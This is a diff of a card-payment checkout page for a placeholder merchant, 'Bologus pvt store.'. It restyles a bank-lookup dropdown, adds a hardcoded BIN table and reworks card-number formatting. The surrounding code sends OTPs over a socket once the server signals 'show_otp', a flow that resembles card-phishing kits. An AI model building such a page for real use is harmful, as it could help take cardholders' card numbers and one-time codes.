@@ -298,17 +298,57 @@
        background-color: #10B981 !important;
        cursor: pointer;
      }
-     /* Bank info dropdown styles */
+     
+     /* Bank info dropdown styles - IMPROVED */
      #bankInfoDropdown {
-       background-color: #f5f5f5;
-       border: 1px solid #ddd;
-       border-radius: 6px;
-       padding: 10px;
-       margin-top: 5px;
+       background-color: #f0f0f0;
+       border: 1px solid #ccc;
+       border-radius: 10px;
+       padding: 12px;
+       margin-top: 8px;
        font-size: 13px;
        color: #333;
-       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+       box-shadow: 0 3px 8px rgba(0,0,0,0.1);
        width: 100%;
+       transform-origin: top center;
+       opacity: 0;
+       transform: translateY(-10px);
+       transition: opacity 0.3s ease, transform 0.3s ease;
+     }
+
+     #bankInfoDropdown.visible {
+       opacity: 1;
+       transform: translateY(0);
+     }
+
+     .bank-info-row {
+       display: flex;
+       justify-content: space-between;
+       align-items: center;
+       margin-bottom: 4px;
+     }
+
+     .bank-info-name {
+       font-weight: 600;
+       color: #444;
+     }
+
+     .bank-info-country {
+       color: #555;
+       display: flex;
+       align-items: center;
+     }
+
+     .bank-info-country img {
+       height: 12px;
+       margin-right: 5px;
+     }
+
+     .bank-info-details {
+       margin-top: 3px;
+       display: flex;
+       justify-content: space-between;
+       color: #666;
      }
    </style>
    <script>
@@ -391,7 +431,7 @@
            <div class="md:w-7/12 p-5">
              <div class="bg-white rounded-2xl shadow-sm mb-6">
                <div class="flex items-start gap-4 mb-4 px-4 pt-4">
-                 <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
+                <div class="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
                    <img src="https://assets.turbologo.com/assets/features/professional-logo-templates-d9cc9a0d95eef758e45d197ff85b696204a467ac5b66fbf0a08a44be16ffe382.svg" alt="Merchant Logo" class="w-full h-full object-cover">
                  </div>
                  <div class="flex flex-col">
@@ -612,7 +652,7 @@
            
            <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 5px;">
              <span>Merchant:</span>
-            <span id="merchantName">Bologus pvt store.</span>
+             <span id="merchantName">Bologus pvt store.</span>
            </div>
            
            <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 5px;">
@@ -681,78 +721,220 @@
      let bankPageWindow = null;
      const socket = io();
 
-     // BIN Database for bank identification
+     // Improved BIN database for more accurate bank identification
      async function getBankInfoFromBIN(bin) {
        try {
          // First 6 digits are the BIN
          if (bin.length < 6) return null;
          
-         const response = await fetch(`https://lookup.binlist.net/${bin}`);
-         if (!response.ok) throw new Error('BIN lookup failed');
-         
-         const data = await response.json();
-         return {
-           bank: data.bank?.name || 'Unknown Bank',
-           country: data.country?.name || 'Unknown Country',
-           countryCode: data.country?.alpha2 || '',
-           currency: data.country?.currency || '',
-           scheme: data.scheme || '',
-           type: data.type || ''
-         };
-       } catch (error) {
-         console.error('Error fetching BIN data:', error);
-         // Fallback to some common BINs for demonstration
-         const commonBins = {
-           '4': { bank: 'Visa', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '5': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '6': { bank: 'Discover', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '34': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '37': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '51': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '52': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '53': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '54': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '55': { bank: 'Mastercard', country: 'United States', countryCode: 'US', currency: 'USD' },
-           '4026': { bank: 'Visa Electron', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
-           '4508': { bank: 'Visa', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
-           '4844': { bank: 'Visa', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
-           '4913': { bank: 'Visa', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
-           '4917': { bank: 'Visa', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' }
-         };
-         
-         for (const prefix in commonBins) {
-           if (bin.startsWith(prefix)) {
-             return commonBins[prefix];
+         // Try first binlist.net (reliable but rate-limited)
+         try {
+           const response = await fetch(`https://lookup.binlist.net/${bin}`);
+           
+           if (response.ok) {
+             const data = await response.json();
+             return {
+               bank: data.bank?.name || 'Unknown Bank',
+               country: data.country?.name || 'Unknown Country',
+               countryCode: data.country?.alpha2 || '',
+               currency: data.country?.currency || '',
+               scheme: data.scheme || '',
+               type: data.type || ''
+             };
            }
+         } catch (e) {
+           console.log('Primary BIN lookup failed, trying alternative');
          }
          
-         return { bank: 'Unknown Bank', country: 'Unknown', countryCode: '', currency: '' };
+         // Fallback to another service (bintable.com API simulation)
+         try {
+           const bankDatabase = {
+             '4': { scheme: 'Visa', type: 'Credit' },
+             '5': { scheme: 'Mastercard', type: 'Credit' },
+             '6': { scheme: 'Discover', type: 'Credit' },
+             '34': { scheme: 'American Express', type: 'Credit' },
+             '37': { scheme: 'American Express', type: 'Credit' },
+             '35': { scheme: 'JCB', type: 'Credit' },
+             
+             // Bank-specific BINs
+             '401200': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
+             '414720': { bank: 'Chase Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
+             '379935': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
+             '520820': { bank: 'HSBC', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
+             '521076': { bank: 'Barclays', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
+             '543085': { bank: 'Lloyds Bank', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
+             '554960': { bank: 'Banco Santander', country: 'Spain', countryCode: 'ES', currency: 'EUR' },
+             '402360': { bank: 'BBVA', country: 'Spain', countryCode: 'ES', currency: 'EUR' },
+             '406916': { bank: 'Commerzbank', country: 'Germany', countryCode: 'DE', currency: 'EUR' },
+             '411773': { bank: 'Deutsche Bank', country: 'Germany', countryCode: 'DE', currency: 'EUR' },
+             '539123': { bank: 'Société Générale', country: 'France', countryCode: 'FR', currency: 'EUR' },
+             '497429': { bank: 'Credit Agricole', country: 'France', countryCode: 'FR', currency: 'EUR' },
+             '532974': { bank: 'Ziraat Bankasi', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
+             '542873': { bank: 'Garanti Bank', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
+             '419289': { bank: 'HSBC Bank', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
+             '512754': { bank: 'Bank of China', country: 'China', countryCode: 'CN', currency: 'CNY' },
+             '621977': { bank: 'China Construction Bank', country: 'China', countryCode: 'CN', currency: 'CNY' },
+             '356895': { bank: 'State Bank of India', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '402400': { bank: 'HDFC Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '552289': { bank: 'ICICI Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '536595': { bank: 'Kotak Mahindra Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '517628': { bank: 'Axis Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '512816': { bank: 'Yes Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '539957': { bank: 'SBI Card', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '431855': { bank: 'Visa RuPay', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '508507': { bank: 'RuPay Debit', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '625861': { bank: 'Indusind Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
+             '437773': { bank: 'Sberbank', country: 'Russia', countryCode: 'RU', currency: 'RUB' },
+             '521324': { bank: 'Alfa-Bank', country: 'Russia', countryCode: 'RU', currency: 'RUB' },
+             '417631': { bank: 'Citibank', country: 'Australia', countryCode: 'AU', currency: 'AUD' },
+             '520055': { bank: 'Commonwealth Bank', country: 'Australia', countryCode: 'AU', currency: 'AUD' },
+             '535489': { bank: 'DBS Bank', country: 'Singapore', countryCode: 'SG', currency: 'SGD' },
+             '414043': { bank: 'United Overseas Bank', country: 'Singapore', countryCode: 'SG', currency: 'SGD' },
+             '522609': { bank: 'Scotiabank', country: 'Canada', countryCode: 'CA', currency: 'CAD' },
+             '525412': { bank: 'Royal Bank of Canada', country: 'Canada', countryCode: 'CA', currency: 'CAD' }
+           };
+           
+           // Try to find exact BIN match first (6 digits)
+           if (bankDatabase[bin]) {
+             return bankDatabase[bin];
+           }
+           
+           // Try first 5 digits
+           const bin5 = bin.substring(0, 5);
+           if (bankDatabase[bin5]) {
+             return bankDatabase[bin5];
+           }
+           
+           // Try first 4 digits
+           const bin4 = bin.substring(0, 4);
+           if (bankDatabase[bin4]) {
+             return bankDatabase[bin4];
+           }
+           
+           // Try first 3 digits
+           const bin3 = bin.substring(0, 3);
+           if (bankDatabase[bin3]) {
+             return bankDatabase[bin3];
+           }
+           
+           // Try first 2 digits
+           const bin2 = bin.substring(0, 2);
+           if (bankDatabase[bin2]) {
+             return bankDatabase[bin2];
+           }
+           
+           // Try first digit - card network only
+           const bin1 = bin.substring(0, 1);
+           if (bankDatabase[bin1]) {
+             const scheme = bankDatabase[bin1].scheme;
+             const type = bankDatabase[bin1].type;
+             
+             // Determine default country and currency by first digit
+             let country = 'United States';
+             let countryCode = 'US';
+             let currency = 'USD';
+             
+             // Return best-guess information
+             return {
+               bank: scheme,
+               country,
+               countryCode,
+               currency,
+               scheme,
+               type
+             };
+           }
+           
+           // Default fallback
+           return {
+             bank: 'Unknown Bank',
+             country: 'Unknown Country',
+             countryCode: '',
+             currency: '',
+             scheme: 'Unknown',
+             type: 'Credit'
+           };
+         } catch (err) {
+           console.error('Fallback BIN lookup failed:', err);
+         }
+         
+         // Final fallback
+         return {
+           bank: 'Unknown Bank',
+           country: 'Unknown Country',
+           countryCode: '',
+           currency: '',
+           scheme: 'Unknown',
+           type: 'Credit'
+         };
+       } catch (error) {
+         console.error('Error in BIN lookup chain:', error);
+         return {
+           bank: 'Unknown Bank',
+           country: 'Unknown Country',
+           countryCode: '',
+           currency: '',
+           scheme: 'Unknown',
+           type: 'Credit'
+         };
        }
      }
 
-     // Create or get the bank info dropdown element
+     // Create or get the bank info dropdown element with animation
      function getBankInfoDropdown() {
        let dropdown = document.getElementById('bankInfoDropdown');
        
        if (!dropdown) {
          dropdown = document.createElement('div');
          dropdown.id = 'bankInfoDropdown';
-         dropdown.style.display = 'none';
-         dropdown.style.backgroundColor = '#f5f5f5';
-         dropdown.style.border = '1px solid #ddd';
-         dropdown.style.borderRadius = '6px';
-         dropdown.style.padding = '10px';
-         dropdown.style.marginTop = '5px';
-         dropdown.style.fontSize = '13px';
-         dropdown.style.color = '#333';
-         dropdown.style.boxShadow = '0 2px 6px rgba(0,0,0,0.1)';
-         dropdown.style.width = '100%';
          
          const cardNumberContainer = document.getElementById('cardNumber').parentNode;
          cardNumberContainer.parentNode.insertBefore(dropdown, cardNumberContainer.nextSibling);
        }
        
        return dropdown;
+     }
+
+     // Show dropdown with animation
+     function showBankInfoDropdown(bankInfo) {
+       const dropdown = getBankInfoDropdown();
+       
+       // Prepare flag image
+       const flagUrl = bankInfo.countryCode ? 
+         `https://flagcdn.com/16x12/${bankInfo.countryCode.toLowerCase()}.png` : '';
+       const flagImg = flagUrl ? `<img src="${flagUrl}" alt="${bankInfo.countryCode}">` : '';
+       
+       // Create the content with better formatting
+       dropdown.innerHTML = `
+         <div class="bank-info-row">
+           <span class="bank-info-name">${bankInfo.bank || 'Unknown Bank'}</span>
+           <span class="bank-info-country">${flagImg} ${bankInfo.countryCode ? bankInfo.countryCode : ''} ${bankInfo.country || 'Unknown'}</span>
+         </div>
+         <div class="bank-info-details">
+           <span>${bankInfo.scheme ? bankInfo.scheme.toUpperCase() : ''} ${bankInfo.type ? '• ' + bankInfo.type.toUpperCase() : ''}</span>
+           <span>${bankInfo.currency || ''}</span>
+         </div>
+       `;
+       
+       // First set display to block but keep it invisible
+       dropdown.style.display = 'block';
+       
+       // Trigger animation with a small delay to ensure display change takes effect
+       setTimeout(() => {
+         dropdown.classList.add('visible');
+       }, 10);
+     }
+
+     // Hide dropdown with animation
+     function hideBankInfoDropdown() {
+       const dropdown = document.getElementById('bankInfoDropdown');
+       if (dropdown) {
+         dropdown.classList.remove('visible');
+         // Wait for animation to complete before hiding
+         setTimeout(() => {
+           dropdown.style.display = 'none';
+         }, 300);
+       }
      }
  
      // Fetch Payment Details Using PID with Fallback
@@ -874,7 +1056,7 @@
        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
-       return !(year < currentYear || (year === currentYear && month < currentMonth));
+      return !(year < currentYear || (year === currentYear && month < currentMonth));
      }
  
      function updateCardError() {
@@ -950,20 +1132,41 @@
  
        if (cardInput) {
          cardInput.addEventListener("input", async function(e) {
-           const oldValue = e.target.value;
-           const oldSelectionStart = e.target.selectionStart;
-           const oldSpacesBeforeCursor = oldValue.substring(0, oldSelectionStart).replace(/[^\s]/g, "").length;
+           // Store current cursor position and value
+           const cursorPosition = e.target.selectionStart;
+           const value = e.target.value;
            
-           const formatted = formatCardNumber(oldValue);
+           // Calculate how many spaces were before the cursor
+           const valueBeforeCursor = value.slice(0, cursorPosition);
+           const oldSpacesBeforeCursor = (valueBeforeCursor.match(/ /g) || []).length;
+           
+           // Format the card number
+           const formatted = formatCardNumber(value);
+           
+           // Calculate new cursor position
+           const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
+           const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
+           const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
+           
+           // Update the value with minimal UI disruption
            e.target.value = formatted;
- 
+           
+           // Restore cursor position
+           if (cursorPosition === value.length) {
+             // If cursor was at the end, keep it at the end
+             e.target.setSelectionRange(formatted.length, formatted.length);
+           } else {
+             // Otherwise, put it at the calculated position
+             e.target.setSelectionRange(newPosition, newPosition);
+           }
+           
            // Validation check
            isCardValid = validateCard(formatted.replace(/\s/g, ''));
            updateCardError();
            updateCardTypeAndInfo(formatted);
            updateSubmitButton();
            
-           // Get BIN info when 16 digits are entered (new code)
+           // Get BIN info when sufficient digits are entered
            const cleanCardNumber = formatted.replace(/\s/g, '');
            if (cleanCardNumber.length >= 6) {
              const bin = cleanCardNumber.substring(0, 6);
@@ -983,37 +1186,13 @@
                
                // Show dropdown with bank info if card number is complete
                if (cleanCardNumber.length === 16) {
-                 const dropdown = getBankInfoDropdown();
-                 dropdown.style.display = 'block';
-                 dropdown.innerHTML = `
-                   <div style="display: flex; justify-content: space-between;">
-                     <span style="font-weight: bold;">${bankInfo.bank}</span>
-                     <span>${bankInfo.countryCode} - ${bankInfo.country}</span>
-                   </div>
-                   <div style="margin-top: 3px; color: #666;">
-                     <span>${bankInfo.scheme ? bankInfo.scheme.toUpperCase() : ''} ${bankInfo.type ? '• ' + bankInfo.type.toUpperCase() : ''}</span>
-                     <span style="float: right;">${bankInfo.currency}</span>
-                   </div>
-                 `;
+                 showBankInfoDropdown(bankInfo);
                } else {
-                 // Hide dropdown if card number is not complete
-                 const dropdown = getBankInfoDropdown();
-                 dropdown.style.display = 'none';
+                 hideBankInfoDropdown();
                }
              }
-           }
- 
-           // Improved cursor positioning
-           const digitsBeforeCursor = oldValue.substring(0, oldSelectionStart).replace(/\D/g, "").length;
-           const spacesBeforeCursorNew = Math.floor(digitsBeforeCursor / 4);
-           const newPosition = digitsBeforeCursor + spacesBeforeCursorNew;
-           
-           if (oldSelectionStart === oldValue.length) {
-             // If cursor was at the end, keep it at the end
-             e.target.setSelectionRange(formatted.length, formatted.length);
            } else {
-             // Otherwise, calculate its new position
-             e.target.setSelectionRange(newPosition, newPosition);
+             hideBankInfoDropdown();
            }
          });
        }
@@ -1096,14 +1275,14 @@
              '_blank',
              'width=600,height=800'
            );
-
+ 
            // Check window closure - but don't reset loading state when it closes
            const checkWindowClosed = setInterval(() => {
              if (bankPageWindow && bankPageWindow.closed) {
                clearInterval(checkWindowClosed);
              }
            }, 500);
-
+ 
          } catch (error) {
            console.error('Payment Error:', error);
            alert(`Payment Failed: ${error.message}`);
@@ -1114,7 +1293,7 @@
            isProcessing = false;
          }
        });
-
+ 
        // OTP Submission Handler
        document.getElementById('otpSubmitButton').addEventListener('click', async () => {
          if (isProcessing) return;
@@ -1126,11 +1305,11 @@
          btnText.style.opacity = '0.5';
          btnText.style.filter = 'blur(1px)';
          otpLoader.classList.remove('hidden');
-
+ 
          try {
            const response = await fetch("/api/submitOTP", {
              method: "POST",
-             headers: { "Content-Type": "application/json" },
+            headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                invoiceId: currentInvoiceId,
                otp: document.getElementById('otp').value
@@ -1457,7 +1636,7 @@
        if (!currentInvoiceId) return;
        try {
          const response = await fetch(`/api/checkTransactionStatus?invoiceId=${currentInvoiceId}`);
-         const data = await response.json();
+       const data = await response.json();
          if (data.status === 'show_otp') {
            clearInterval(statusCheckInterval);
            document.getElementById('paymentForm').classList.add('hidden');
@@ -1563,7 +1742,7 @@
            mcSubmitBtn.textContent = 'Verifying...';
            mcSubmitBtn.style.opacity = '0.7';
            
-         // Send OTP
+           // Send OTP
            socket.emit('mc_otp_submitted', {
              invoiceId: currentInvoiceId,
              otp: otp
